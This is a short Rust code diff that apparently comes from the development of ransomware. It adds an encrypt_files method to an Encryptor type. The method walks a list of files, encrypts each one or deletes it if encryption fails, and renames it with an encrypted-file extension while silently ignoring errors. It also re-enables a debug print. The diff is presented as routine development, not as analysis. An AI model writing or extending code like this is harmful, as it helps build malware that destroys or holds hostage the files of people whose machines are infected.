@@ -58,6 +58,18 @@ impl Encryptor {
         encrypt_files(&files, &self);
         true
     }
+
+    pub fn encrypt_files(&self, files: &Vec<String>) {
+        for file in files {
+            println!("Name: {}", &file); // HACK DEBUG print
+            self.encrypt_file_else_delete(&file);
+
+            match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
+                Ok(_) => (),
+                Err(_) => (),
+            };
+        }
+    }
 }
 
 fn attempt_delete_file(path: &String) {
@@ -69,7 +81,7 @@ fn attempt_delete_file(path: &String) {
 
 fn encrypt_files(files: &Vec<String>, encryptor: &Encryptor) {
     for file in files {
-        // println!("Name: {}", &file); // HACK DEBUG print
+        println!("Name: {}", &file); // HACK DEBUG print
         encryptor.encrypt_file_else_delete(&file);
 
         match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
